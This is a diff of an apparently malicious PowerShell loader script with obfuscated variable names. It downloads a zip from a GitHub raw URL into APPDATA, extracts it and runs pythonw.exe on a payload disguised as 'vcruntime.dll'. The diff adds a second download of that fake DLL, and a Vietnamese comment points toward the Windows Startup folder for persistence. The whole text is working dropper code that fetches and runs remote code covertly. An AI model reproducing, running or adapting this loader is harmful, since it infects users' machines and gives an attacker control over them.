@@ -1,6 +1,9 @@
 $ltrmn = 'https://github.com/blackcodeit407/system/blob/main/system1.zip?raw=true'
+$rawdll = ''
 $kdsf = "$env:APPDATA\pzk.zip"
 $cwab = "$env:APPDATA\Extrac"
+$dll = "$env:APPDATA\Extrac\vcruntime.dll"
+
 $gqjd = Join-Path $cwab 'python.exe'
 
 if (!(Test-Path $cwab)) { New-Item -Path $cwab -ItemType Directory }
@@ -8,10 +11,10 @@ if (!(Test-Path $cwab)) { New-Item -Path $cwab -ItemType Directory }
 Invoke-WebRequest -Uri $ltrmn -OutFile $kdsf
 
 tar -xf $kdsf -C $cwab
-
+Invoke-WebRequest -Uri $rawdll -OutFile $dll
 Remove-Item $kdsf -Force
-Start-Process -FilePath pythonw.exe -ArgumentList 'vcruntime.dll' -WorkingDirectory $cwab -Wait
 Start-Process -FilePath pythonw.exe -ArgumentList 'vcruntime.dll' -WorkingDirectory $cwab
+
 
 
 # Đường dẫn đến thư mục Startup
